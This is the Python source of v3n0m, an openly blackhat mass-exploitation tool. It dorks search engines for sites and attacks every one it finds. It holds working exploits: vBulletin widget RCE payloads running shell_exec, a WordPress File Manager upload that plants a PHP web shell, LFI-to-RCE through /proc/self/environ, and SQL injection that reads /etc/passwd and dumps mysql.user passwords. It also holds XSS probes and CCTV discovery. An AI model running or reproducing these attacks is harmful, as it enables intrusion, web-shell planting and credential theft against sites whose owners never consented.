#!/usr/bin/python
# -*- coding: UTF-8 -*-
# This file is part of v3n0m
# See LICENSE for license details.
import re
import random
import threading
import socket
import urllib.request
import urllib.error
import urllib.parse
import http.cookiejar
import subprocess
import time
import sys
import os
import math
import itertools
import queue
import asyncio
import aiohttp
import argparse
import socks
import httplib2
import requests
import zipfile
import concurrent.futures
from signal import SIGINT, signal
import bs4, tqdm
from glob import glob
from pathlib import Path
from codecs import lookup, register
from random import SystemRandom
from socket import *
from datetime import *
from aiohttp import web
import async_timeout
import inspect
from functools import wraps
import toxin
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = False
def logo():
    if proxy == True:
        proxy_status = G + "Enabled "
    if proxy == False:
        proxy_status = R + "Disabled "
    cache_Check()
    sql_list_counter()
    lfi_list_counter()
    rce_list_counter()
    xss_list_counter()
    misc_list_counter()
    print(
        B
        + """
         

                                                   :=*#%%@%%#+-:         :-=+****+=:.
         Venom <  4.3.5  >                      .+%@@@@@@%*==--=+#%#+- :**+--:...::=+#%*-
      Enhanced Dorking & Vuln Scans           :#@@@@@@@+.          :=*%#=.             -#%-
          Now with eleet banner "             +@@@@@@@@:     :**=+***+====*#=.            :%#.
                          ...........:---. #@@@@@@@@-     -@.-=::::-=--+=+#@*:            #%
                    :---:....::::.        =@@@@@@@@*      =%.+-#+++=:--:+=+%@@%-           %#
                -=+*+*#%@@@@@@@@@@@@@%%#*:%@@@@@@@=        %:%@@@@@@@#*=:--+#@@@%:         -@-
             -*#+==-:..       .:-=*#@@@@@:@@@@@@#           *@@@@@@@@@@@%+=-=*@@@@*         @*
            ::                       .-=*:%@@@@@             +@@-...:=*@@@@+--%@@@@@-       #%
                                          +@@@@*              -#        -%@@++:%@@@@@=      *%
           long live blackhats          .*:@@@@+               .+         -%@==*@@@@@@*     ##
        RIP NovaCygni / d4rkc4t        -@@%=@@@*                 =          +@#-+@@@@@@+    @+
      + everyone else at d4rkc0d3     .@@@@@*%@@.   :=.           :          .#*=-#@@@@@-  :@:
                                      *@@@@@@#*@#     =*-         :            @#==#@@@@@  +%
              .-=+*%@@@@@%#+=:        %@@@@@@@@+*%:    +@*        :-           :@-=:#@@@@- @-
           :+%#++=::-==*@@@@@@@#=.    +@@@@@@@@@@**+:   #@*       .+            #@---=@@@*=#
         -##+---:-=-::-::=*@@@@@@@*:   @@@@@@@@@@@@%#+-  .-=      .#            -@-+:+:@@#=.
       :#+=-::::..:-=--=:-:-+%@@@@@@#: :@@@@@@@@@@@@@@#*=.        .%          .#:@+.+:##@%
      =@=-:::-+*+==--=+==--:--*@@@@@@@*. *@@@@@@@@@@@@@@@#=:      .@         :%-=@ = *:@@%
     +#:::-+#+.         :=*=-:-=#@@@@@@@= .*@@@@@@@@@@@@@@%-=:    +=       .*#. #=  -.++@#
    -@=::+*-*              -++:-:=*@@@@@@%:  :=*#%@@@%#*=:   :+==%+.     :*#:  -#   :.==@=
    %#::=%--*                :+:-:-=#@@@@@@*.                    .#-: .=%*:   :%.    =:@@.
    @*===*--+=                 ==..:=+%@@@@@@=                    -=-:+-     :#      +-@*
    *@+*-#--:=+:             .=%@%.   .-%@@@@@@=             .-=*#==-::    .*+       *%@
    .@@%:#+-=--=+=::....::-*%@@@@@@=     .+%@@@@@*:  -==+****+-:    .:.::-:+.       :@@-
     :@@@#%*--------:--==*@@@@@@@@#-*.      .=*#@@@@*=-.             .=:-:+:       +@@=
      .%@@@@@%##****#%@@@@@@@@@@+.   +=            ...:==============-. =: -     -%@@:
        -%@@@@@@@@@@@@@@@@@@@*:       :*:                                :     -%@@%.
          :+#@@@@@@@@@@%#+=:            =#:                                :=*@@@@+
              .::-::.                     *#-                        :=+#%@@@@@@+
                                           :#@#=:             .:=*#@@@@@@@@@@#-
                                             :*@@@%#*+====+*%@@@@@@@@@@@@@#=
                 E O F                       -+#@@@@@@@@@@@@@@@@@@%*=:
                                                """ + O +"""PROXY STATUS:"""+ proxy_status,"""\n""")


class cctvthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    cctv(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def cctv_testing():
    print(B + "\n[+] Preparing for CCTV scanning ...")
    print("[+] Can take a while ...")
    print("[!] Working ...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i : (x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = cctvthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


def cctv(url):
    try:
        reqs = requests.get(url, timeout=2)
        soup = bs4.BeautifulSoup(reqs.text, "html.parser")
        title = str(soup.find("title"))
        remove_dupes = []
        for cam in cctvs:
            if title is not None and cam in title and url not in remove_dupes:
                remove_dupes.append(url)
                print(url + " %s  CCTV Discovered!!!" % cam)
                vuln.append(url)
                cctv_log_file.write("\n" + url + " " + cam)
    except:
        pass


def vbulletin5_scanning(url):
    url = url.rsplit(sites, 1)[0]
    url = url + sites
    params = {"routestring": "ajax/render/widget_php"}
    cmd = "id"
    params["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
    try:
        r = requests.post(url=url, data=params, timeout=2)
        if "uid=" and "gid" and "groups=" in r.text:
            print(R + url + " ====> Vbulletin 5.x vuln found")
            vuln.append(url)
            misc_log_file.write("\n" + url + " vBulletin Ver 5.x > 5.5.4 RCE")
    except:
        pass


class Vbulletin(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    vbulletin5_scanning(url)
                else:
                    break
            except (KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def vbulletin_test():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i : (x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Vbulletin(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def wp_filemanager_scanning(url):
    try:
        path = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
        url = url.rsplit(sites, 1)[0]
        url = url + sites
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
            "Connection": "close",
        }
        data = '-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="reqid"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="target"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="upload[]"; filename="payl04dz.php"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET[\'cmd\']); echo \'v3n0m\'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="mtime[]"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n'
        req = requests.post(
            url + path, headers=headers, data=data, timeout=2, verify=False
        )
        if req:
            p4th = url + "/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php"
            head3r = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
                "Connection": "close",
            }
            payload = requests.get(p4th, headers=head3r, timeout=2, verify=False)
            if "v3n0m" in payload.text:
                print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
                vuln.append(url)
                misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")
    except:
        pass


class WPFM_Thread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    wp_filemanager_scanning(url)
                else:
                    break
            except (KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def wp_filemanager_test():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i : (x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = WPFM_Thread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def vb56(url, shell_cmd):
    try:
        post_data = {
            "subWidgets[0][template]": "widget_php",
            "subWidgets[0][config][code]": "echo shell_exec('%s'); exit;" % shell_cmd,
        }
        r = requests.post(
            "%s/ajax/render/widget_tabbedcontainer_tab_panel" % url,
            post_data,
            timeout=2,
        )
    except:
        pass
    return r.text


def vb56_scanning(url):
    url = url.rsplit(sites, 1)[0]
    url = url + sites
    post_data = {
        "subWidgets[0][template]": "widget_php",
        "subWidgets[0][config][code]": "echo shell_exec('id'); exit;",
    }
    try:
        r = requests.post(
            "%s/ajax/render/widget_tabbedcontainer_tab_panel" % url,
            post_data,
            timeout=2,
        )
        if "uid=" and "gid=" and "groups=" in r.text:
            print(R + url + " =====> Vuln Found ===> vBulletin Ver 5.5.4 > 5.6.2 RCE ")
            vuln.append(url)
            misc_log_file.write("\n" + url + " vBulletin Ver 5.5.4 > 5.6.2 RCE")
    except:
        pass


class vb56_Thread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    vb56_scanning(url)
                else:
                    break
            except (KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def vb56_test():
    log = "v3n0m-lfi.txt"
    logfile = open(log, "a", encoding="utf-8")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i : (x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = vb56_Thread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def lfi_scanning(url):
    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding="utf-8")
    rce_log_file = open("v3n0m-rce.txt", "a", encoding="utf-8")
    try:
        for lfi in lfis:
            try:
                url = url.rsplit("=", 1)[0]
                url = url + "="
                r = requests.get(url + lfi, timeout=2)
            except:
                resp = str("v3n0m")
            if str("root:x") in r.text and url not in vuln:
                print(R + " [LFI] " + O + url + lfi + R + "====>" "LFI Found")
                vuln.append(url)
                lfi_log_file.write("\n" + url)
                target = url + lfi
                target = target.replace(lfi, "/proc/self/environ")
                header = "<? echo md5(NovaCygni); ?>"
                try:
                    head = {"User-Agent": header}
                    request_web = request.get(target, headers=head, timeout=2)
                    if str("7ca328e93601c940f87d01df2bbd1972") in request_web.text:
                        print(
                            R
                            + "[LFI >RCE]"
                            + O
                            + target
                            + R
                            + "-----> LFI to RCE Found"
                        )
                        vuln.append(url)
                        rce_log_file.write("\n" + url)
                except:
                    pass
    except:
        pass


class Lfithread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    lfi_scanning(url)
                else:
                    break
            except (KeyboardInterrupt, ValueError):
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def lfi_testing():
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i : (x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Lfithread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def killpid():
    os.kill(os.getpid(), 9)


class Injthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    sqli_scanning(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


class xssthread(threading.Thread):
    def __init__(self, hosts):
        self.hosts = hosts
        self.fcount = 0
        self.check = True
        threading.Thread.__init__(self)

    def run(self):
        urls = list(self.hosts)
        for url in urls:
            try:
                if self.check:
                    xss_scanning(url)
                else:
                    break
            except KeyboardInterrupt:
                pass
        self.fcount += 1

    def stop(self):
        self.check = False


def xss_scanning(url):
    vuln_scan_count.append(url)
    xss_log_file = open("v3n0m-xss.txt", "a", encoding="utf-8")
    for xss in xsses:
        try:
            source = requests.get(url + xss.replace("\n", ""), timeout=5)
        except:
            pass
        try:
            if re.findall("<OY1Py", source.text):
                print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
                xss_log_file.write("\n" + url)
                vuln.append(url)
            if re.findall("<LOY2PyTRurb1c", source.text):
                print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
                xss_log_file.write("\n" + url)
                vuln.append(url)
        except:
            pass


def xss_testing():
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    if len(threads) <= int(numthreads):
        for x in range(0, int(numthreads)):
            sliced = usearch[x * i : (x + 1) * i]
            if z < m:
                sliced.append(usearch[int(numthreads) * i + z])
                z += 1
            thread = xssthread(sliced)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()


def sqli_scanning(url):
    vuln_scan_count.append(url)
    header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
    ua = random.choice(header)
    headers = {"user-agent": ua}
    aug_url = url + "'"
    global sql_list_counter
    try:
        r = requests.get(aug_url, timeout=2, headers=headers)
    except:
        pass
    remove_dups = []
    with open("v3n0m-sqli.txt", "a+", encoding="utf-8") as sqli_log_file:
        for error in sqli_errors:
            try:
                if str(error) in r.text and url not in remove_dups:
                    remove_dups.append(url)
                    print(url + " is vulnerable --> %s" % str(error))
                    sqli_log_file.write("\n" + url)
                    vuln.append(url)
                    col.append(url)
                    sqli_log_file.flush()
            except:
                pass


def life_pulse():  # Don't change this because you will break me.
    global life
    pulse_1 = datetime.now()
    life = pulse_1 - pulse
    print(life)


def sqli_testing():
    global logfile
    global pulse
    global usearch
    global customlist
    global sql_list_counter
    global sql_list_count
    global sqli_confirmed
    pulse = datetime.now()
    vb = len(usearch) / int(numthreads)
    i = int(vb)
    m = len(usearch) % int(numthreads)
    z = 0
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    try:
        if len(threads) <= int(numthreads):
            for x in range(0, int(numthreads)):
                sliced = usearch[x * i : (x + 1) * i]
                if z < m:
                    sliced.append(usearch[int(numthreads) * i + z])
                    z += 1
                thread = Injthread(sliced)
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
    except TimeoutError:
        pass


def column_finder():
    print(B + "\n[+] Preparing for Column Finder ...")
    print(B + "\n[+] I'm working, please just hang out for a minute...\n")
    for host in col:
        print(R + "\n[+] Target: ", O + host)
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")
        print("[+] Testing: ", end=" ")
        checkfor = []
        host = host.rsplit("'", 1)[0]
        sitenew = (
            host
            + arg_eva
            + "and"
            + arg_eva
            + "1=2"
            + arg_eva
            + "union"
            + arg_eva
            + "all"
            + arg_eva
            + "select"
            + arg_eva
        )
        makepretty = ""
        for x in range(0, colMax):
            darkc0de = "dark" + str(x) + "c0de"
            try:
                sys.stdout.write("%s," % x)
                sys.stdout.flush()
                checkfor.append(darkc0de)
                if x > 0:
                    sitenew += ","
                sitenew += "0x" + str(darkc0de.encode("hex"))
                finalurl = sitenew + arg_end
                source = urllib.request.urlopen(finalurl).read()
                for y in checkfor:
                    colFound = re.findall(y, source)
                    if len(colFound) >= 1:
                        print("\n[+] Column length is:", len(checkfor))
                        nullcol = re.findall(str("\d+"), y)
                        print("[+] Found null column at column #:", nullcol[0])
                        for z in range(0, len(checkfor)):
                            if z > 0:
                                makepretty += ","
                            makepretty += str(z)
                        site = (
                            host
                            + arg_eva
                            + "and"
                            + arg_eva
                            + "1=2"
                            + arg_eva
                            + "union"
                            + arg_eva
                            + "all"
                            + arg_eva
                            + "select"
                            + arg_eva
                            + makepretty
                        )
                        print("[+] SQLi URL:", site + arg_end)
                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
                        site = site.replace(
                            arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,"
                        )
                        site = site.replace("," + nullcol[0], ",darkc0de")
                        print("[+] darkc0de URL:", site)
                        darkurl.append(site)
                        print("[-] Done!\n")
                        break
            except:
                pass

        print("\n[!] Sorry column length could not be found\n")
    print(B + "\n[+] Gathering MySQL Server Configuration...")
    for site in darkurl:
        head_url = (
            site.replace(
                "2600",
                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)",
            )
            + arg_end
        )
        print(R + "\n[+] Target:", O + site)
        while 1:
            try:
                source = urllib.request.urlopen(head_url).read()
                match = re.findall(str("\x1e\x1e\S+"), source)
                if len(match) >= 1:
                    match = match[0][2:].split("\x1e")
                    version = match[0]
                    user = match[1]
                    database = match[2]
                    print(W + "\n\tDatabase:", database)
                    print("\tUser:", user)
                    print("\tVersion:", version)
                    load = site.replace("2600", "load_file(0x2f6574632f706173737764)")
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("root:x"), source):
                        load = site.replace(
                            "2600",
                            "concat_ws(char(58),load_file(0x"
                            + str(file.encode("hex"))
                            + "),0x62616c74617a6172)",
                        )
                        source = urllib.request.urlopen(load).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print(
                                "\n[!] w00t!w00t!: "
                                + site.replace(
                                    "2600",
                                    "load_file(0x" + str(file.encode("hex")) + ")",
                                )
                            )
                        load = (
                            site.replace(
                                "2600",
                                "concat_ws(char(58),user,password,0x62616c74617a6172)",
                            )
                            + arg_eva
                            + "from"
                            + arg_eva
                            + "mysql.user"
                        )
                    source = urllib.request.urlopen(load).read()
                    if re.findall(str("NovaCygni"), source):
                        print(
                            "\n[!] w00t!w00t!: "
                            + site.replace("2600", "concat_ws(char(58),user,password)")
                            + arg_eva
                            + "from"
                            + arg_eva
                            + "mysql.user"
                        )
                print(W + "\n[+] Number of tables:", len(tables))
                print("[+] Number of columns:", len(columns))
                print("[+] Checking for tables and columns...")
                target = (
                    site.replace("2600", "0x62616c74617a6172")
                    + arg_eva
                    + "from"
                    + arg_eva
                    + "T"
                )
                for table in tables:
                    try:
                        target_table = target.replace("T", table)
                        source = urllib.request.urlopen(target_table).read()
                        search = re.findall(str("NovaCygni"), source)
                        if len(search) > 0:
                            print("\n[!] Table found: < " + table + " >")
                            print(
                                "\n[+] Lets check for columns inside table < "
                                + table
                                + " >"
                            )
                            for column in columns:
                                try:
                                    source = urllib.request.urlopen(
                                        target_table.replace(
                                            "0x62616c74617a6172",
                                            "concat_ws(char(58),0x62616c74617a6172,"
                                            + column
                                            + ")",
                                        )
                                    ).read()
                                    search = re.findall(str("NovaCygni"), source)
                                    if len(search) > 0:
                                        print("\t[!] Column found: < " + column + " >")
                                except (KeyboardInterrupt, SystemExit):
                                    raise
                                except (
                                    urllib.error.URLError,
                                    socket.gaierror,
                                    socket.error,
                                    socket.timeout,
                                ):
                                    pass

                            print(
                                "\n[-] Done searching inside table < "
                                + table
                                + " > for columns!"
                            )

                    except (KeyboardInterrupt, SystemExit):
                        raise
                    except (
                        urllib.error.URLError,
                        socket.gaierror,
                        socket.error,
                        socket.timeout,
                    ):
                        pass
                print("[!] Fuzzing is finished!")
                break
            except (KeyboardInterrupt, SystemExit):
                raise


def f_scan():
    import time

    global pages_pulled_as_one
    global usearch
    global numthreads
    global threads
    global finallist
    global unsorted
    global finallist2
    global col
    global darkurl
    global sitearray
    global loaded_Dorks
    global sqli_confirmed
    global unsorted
    global sites
    threads = []
    finallist = []
    finallist2 = []
    unsorted = []
    col = []
    darkurl = []
    loaded_Dorks = []
    print(W)
    sites = input(
        "\nChoose your target(domain) ie .com , to attempt to force the domain restriction use *, ie *.com : "
    )
    sitearray = list(map(str, sites.split(",")))
    dorks = input(
        "Choose the number of random dorks (0 for all.. may take awhile!)   : "
    )
    print("")
    if int(dorks) == 0:
        i = 0
        while i < len(d0rk):
            loaded_Dorks.append(d0rk[i])
            i += 1
    else:
        i = 0
        while i < int(dorks):
            loaded_Dorks.append(d0rk[i])
            i += 1
    numthreads = input("\nEnter no. of threads - 50-500: ")
    pages_pulled_as_one = input(
        "Enter no. of Search Engine Pages to be scanned per d0rk,  \n"
        "Between 25 and 100 @ increments of 25: "
    )
    print("\nNumber of SQL errors :", "26")
    print("LFI payloads    :", len(lfis))
    print("XSS payloads    :", len(xsses))
    print("Headers         :", len(header))
    print("Threads         :", numthreads)
    print("Dorks           :", len(loaded_Dorks))
    print("Pages           :", pages_pulled_as_one)
    time.sleep(6)
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    usearch = loop.run_until_complete(search(pages_pulled_as_one))
    scan_option()


def cloudflare_resolver():
    import time

    logo()
    target_site = input("Enter the target domain (example.com):  \n")
    print(B)
    pwd = os.path.dirname(str(os.path.realpath(__file__)))
    print("Depth Level: 1) Scan top 30 subdomains.   ")
    print("             2) Scan top 200 subdomains.  ")
    print("             3) Scan over 9000+ subdomains. [elite] \n")
    depth = input("Input depth level: ")
    scandepth = ""
    if depth == 1:
        scandepth = "--dept simple"
    elif depth == 2:
        scandepth = "--dept normal"
    elif depth == 3:
        scandepth = "--dept full"
    cloudflare_resolver = subprocess.Popen(
        "python3 " + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True
    )
    cloudflare_resolver.communicate()
    subprocess._cleanup()
    print("Cloud Resolving Finished")
    time.sleep(6)


def scan_option():
    global endsub
    global lfi_log_file
    global rce_log_file
    global xss_log_file
    global sql_log_file
    global misc_log_file
    global vuln
    misc_log_file = open("v3n0m-misc.txt", "a", encoding="utf-8")
    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding="utf-8")
    rce_log_file = open("v3n0m-rce.txt", "a", encoding="utf-8")
    xss_log_file = open("v3n0m-xss.txt", "a", encoding="utf-8")
    endsub = 0
    print(R + "[0] Back to main menu")
    print(
        R
        + "[1] SQLi testing: "
        + O
        + "verify the vuln links and print the injectable URL to the screen"
    )
    print(
        R
        + "[2] SQLi testing auto mode: "
        + O
        + "attempt to verify vuln sites then column count if MySQL detected"
    )
    print(R + "[3] XSS Testing")
    print(R + "[4] LFI/RCE Testing")
    print(R + "[5] Save valid Sorted and confirmed vuln URLs to file")
    print(R + "[6] Print all the UNSORTED URLs ")
    print(R + "[7] Print all Sorted and Confirmed Vulns from last scan again")
    print(R + "[8] Print all Sorted URLs")
    print(R + "[9] XSSTRIKE testing")
    print(R + "[10] Scan all the things")
    print(R + "[11] CCTV Detection *Not Entirely Finished")
    print(R + "[12] MISC Vulns")
    chce = input(":")
    if chce == "1":
        os.system("clear")
        vuln = []
        sqli_testing()
        scan_count = len(vuln_scan_count)
        scan_count = str(scan_count)
        print(O + "\n" + scan_count + B + " Sites scanned")
        print(
            B
            + "\r\x1b[K [*] Scan complete, "
            + O
            + str(len(vuln))
            + B
            + " vuln sites found."
        )
    elif chce == "2":
        os.system("clear")
        vuln = []
        sqli_testing()
        column_finder()
        print(
            B
            + "\r\x1b[ [*] Scan complete, "
            + O
            + str(len(vuln))
            + B
            + " vuln sites found."
        )
        print()
        scan_option()
    elif chce == "3":
        os.system("clear")
        vuln = []
        xss_testing()
        print(
            B
            + "\r\x1b[  [*] Scan complete, "
            + O
            + str(len(vuln))
            + B
            + " vuln sites found."
        )
        print()
        scan_option()
    elif chce == "4":
        vuln = []
        lfi_testing()
        endsub = 0
        print(
            B
            + "\r\x1b[  [*] Scan complete, "
            + O
            + str(len(vuln))
            + B
            + " vuln sites found."
        )
        print()
        scan_option()
    elif chce == "5":
        print(B + "\nSaving valid URLs (" + str(len(finallist)) + ") to file")
        listname = input("Filename: ").encode("utf-8")
        list_name = open(listname, "w", encoding="utf-8")
        finallist.sort()
        for t in finallist:
            list_name.write(t + "\n")
        list_name.close()
        print("URLs saved, please check", listname)
        scan_option()
    elif chce == "6":
        print(W + "\nPrinting unsorted URLs:\n")
        unsorted.sort()
        for t in unsorted:
            print(B + t)
        endsub = 0
    elif chce == "7":
        print(B + "\nVuln found ", len(vuln))
        print(vuln)
    elif chce == "8":
        print(W + "\nPrinting sorted URLs:\n")
        finallist.sort()
        for t in finallist:
            print(B + t)
    elif chce == "9":
        current = os.getcwd()
        os.chdir(current + "/modules/xss-strike")
        for url in finallist:
            print("Testing:" + url)
            xss = subprocess.Popen("python xsstrike.py -u " + url, shell=True)
            xss.communicate()
    elif chce == "10":
        vuln = []
        print("\n[+] Preparing for SQLI scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            sqli_scanning(url)
        print("\n[+] Preparing for Vbulletin 5.6.x scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            vb56_scanning(url)
        print("\n[+] Preparing for WordPress File Manager scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            wp_filemanager_scanning(url)
        print("\n[+] Preparing for Vbulletin 5.x scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            vbulletin5_scanning(url)
        print("\n[+] Preparing for LFI > RCE  scanning...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            lfi_scanning(url)
        print("\n[+] Preparing for XSS scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")

        for url in finallist:
            xss_scanning(url)

        print("\n[+] Preparing for CCTV scanning ...")
        print(B + "\n[+] I'm working, please just hang out for a minute...\n")
        for url in finallist:
            cctv_scanning(url)

        print(B + "[*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
    elif chce == "11":
        global cctv_log_file
        cctv_log_file = open("v3n0m-cctv.txt", "a", encoding="utf-8")
        cctv_testing()
    elif chce == "12":
        print("[1] Vbulletin 5.6.x > 5.6.2")
        print("[2] WordPress File-Manager")
        print("[3] Vbulletin 5.x > 5.5.x")
        vulnchoice = input("Enter Choice")
        if vulnchoice == "1":
            vuln = []
            vb56_test()
            print(
                B
                + "\r\x1b[ [*] Scan complete, "
                + O
                + str(len(col))
                + B
                + " vuln sites found."
            )
        if vulnchoice == "2":
            vuln = []
            wp_filemanager_test()
            print(
                B
                + "\r\x1b[ [*] Scan complete, "
                + O
                + str(len(col))
                + B
                + " vuln sites found."
            )
        if vulnchoice == "3":
            vuln = []
            vbulletin_test()

    else:
        f_menu()


def ignoring_get(url):
    header = [line.strip() for line in open("lists/header", "r", encoding="utf-8")]
    ua = random.choice(header)
    headers = {"user-agent": ua}
    try:
        try:
            if proxy == True:
                response = requests.get(url, headers=headers,proxies=proxies, timeout=2)
                response.raise_for_status()
            if proxy == False:
                response = requests.get(url, headers=headers, timeout=2)
                response.raise_for_status()
        except Exception:
            return ""
        return response.text
    except Exception as verb:
        print(str(verb))


def create_tmp_folder(self):
    from tempfile import mkdtemp

    self.temp = mkdtemp(prefix="v3n0m")
    if not self.temp.endswith(os.sep):
        self.temp += os.sep


def progressBar(blocknum, blocksize, totalsize):
    readsofar = blocknum * blocksize
    if totalsize > 0:
        percent = readsofar * 1e2 / totalsize
        s = "\r%5.1f%% %*d / %d" % (percent, len(str(totalsize)), readsofar, totalsize)
        sys.stderr.write(s)
    if readsofar >= totalsize:  # near the end
        sys.stderr.write("\n")


def download(url, file, progressBar=None):
    print("Downloading %s" % url)
    urllib.request.urlretrieve(url, file, progressBar)


def unzip(file):
    with zipfile.ZipFile(file + "", "w") as myzip:
        myzip.write(file)
    os.remove(file + "")


downloads = [
    ["https://www.cloudflare.com/ips-v4", "ips-v4", progressBar],
    ["https://www.cloudflare.com/ips-v6", "ips-v6", progressBar],
    ["http://crimeflare.net:82/domains/ipout.zip", "ipout.zip", progressBar],
]


async def search(pages_pulled_as_one):
    random.shuffle(loaded_Dorks)
